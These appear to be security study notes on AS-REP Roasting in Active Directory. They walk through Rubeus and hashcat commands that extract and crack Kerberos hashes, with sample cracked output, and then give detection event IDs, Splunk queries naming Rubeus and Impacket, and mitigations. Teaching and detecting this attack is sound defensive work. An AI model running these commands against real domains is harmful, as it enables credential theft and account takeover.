Original Notes

AS-REPRoasting

AS-REP Roasting targets Active Directory accounts with the "Do not require Kerberos preauthentication" flag enabled. When preauthentication is disabled, the domain controller returns an AS-REP message encrypted with the user's password hash. Attackers capture this message and then perform offline brute-force or dictionary attacks to recover the plaintext password.

MITRE ATT&amp;CK ID: T1558.004

1- Understanding the Attack

  • Attack Vector:

Targets AD accounts configured to bypass Kerberos preauthentication.

  • Mechanism:

Without preauthentication, the domain controller issues an AS-REP containing data encrypted with the user's password hash. This data can be captured and cracked offline, revealing the account’s plaintext password.

2- Steps of an AS-REP Roasting Attack

a. Identify Vulnerable Accounts

  • Objective:

Find accounts with the "Do not require Kerberos preauthentication" flag enabled.

  • Example Command (PowerShell):

```powershell Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object { $_.DoesNotRequirePreAuth -eq $True -and $_.Enabled -eq $True } | Select-Object SamAccountName, DoesNotRequirePreAuth

```

  • Example Output:

``jsx SamAccountName DoesNotRequirePreAuth -------------- ---------------------- ESMERALDA_MIRANDA True jdoe True ``

b. Extract AS-REP Hashes

  • Process:

Use Rubeus to capture AS-REP messages from vulnerable accounts.

  • Example Command:

``powershell Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt ``

  • Example Outcome (hashes.txt):

``powershell $krb5asrep$23$ESMERALDA_MIRANDA@domain.local:b4d9969983602fa94d7fe07f55a2a0a2$... ``

c. Offline Password Cracking

  • Objective:

Crack the captured AS-REP hash to reveal the plaintext password.

  • Example Command Using Hashcat:

``java hashcat64.exe -m 18200 C:\Temp\hashes.txt dictionary.dict ``

  • Example Outcome:

``java $krb5asrep$23$ESMERALDA_MIRANDA@domain.local:...:BossofNY05 ``

(Indicates the plaintext password for the target account is "BossofNY05")

3- Key Tools

  1. Rubeus
    • Usage:

Extracts AS-REP messages and converts them into a format suitable for offline cracking.

Hash ready for cracking

  1. Mimikatz
    • Usage:

Can assist with additional credential dumping and post-exploitation tasks.

  1. Hashcat
    • Usage:

Performs offline brute-force or dictionary attacks on the captured AS-REP hash.

4- Detection and Defensive Strategies

Detection

  • Event ID 4738 (User Account Changed):

Watch for modifications to user account properties, especially when Do not require Kerberos preauthentication is enabled.

  • Event ID 5136 (Directory Service Object Modified):

Detect unauthorized changes to directory objects that may weaken account security.

  • Event ID 4768 (TGT Requested):

Look for Kerberos TGT requests with PreAuthType=0, which indicate accounts not requiring preauthentication. These should be rare and stand out in normal operations.

  • Event ID 4769 (Service Ticket Granted):

Pay attention to AS-REP responses using RC4 encryption (etype 0x17), as attackers often downgrade encryption to crackable hashes.

  • Behavioral Indicators:
    • Multiple AS-REP replies without matching AS-REQs.
    • Activity from non-domain-joined hosts (Linux/Kali, Python scripts, Impacket, Rubeus).
    • Sudden AS-REP spikes targeting service accounts (svc-, sql-).
  • Splunk Examples:

``jsx index=omar EventCode=4768 PreAuthType=0 NOT TargetUserName="*$" | table _time, ComputerName, TargetUserName, IpAddress ``

``jsx index=omar EventCode=4769 TicketEncryptionType=0x17 NOT TargetUserName="*$" | stats count by TargetUserName, IpAddress, ComputerName ``

``jsx index=omar EventCode IN (4624,4625,4672) TargetUserName IN ("svc-sql","attacker") | table _time, TargetUserName, IpAddress, LogonType ``

``jsx index=omar EventCode=1 (NewProcessName="rubeus" OR NewProcessName="impacket" OR NewProcessName="python.exe") | table _time, host, User, NewProcessName, ParentProcessName ``

5- Mitigation Measures

  • Enforce Kerberos Preauthentication:

Require preauthentication for all accounts to block AS-REP responses.

  • Strong Passwords:

Use long, complex passphrases to resist offline brute-forcing.

  • Account Privilege Control:

Restrict who can modify preauthentication settings; audit these changes regularly.

  • Encryption Hardening:

Enforce AES (AES128/AES256) instead of RC4 to minimize downgrade risks.

  • Monitoring & Alerts:

Configure SIEM rules to trigger on suspicious AS-REP/TGT activity from unusual IPs or non-DC systems.

6- Summary

  • Protocol Targeted: Kerberos
  • Authentication Material: AS-REP messages (encrypted with the user's password hash)
  • Scope of Attack: Credential compromise via offline brute-force or dictionary attacks on accounts with preauthentication disabled
  • Key Tools: Rubeus, Mimikatz, Hashcat
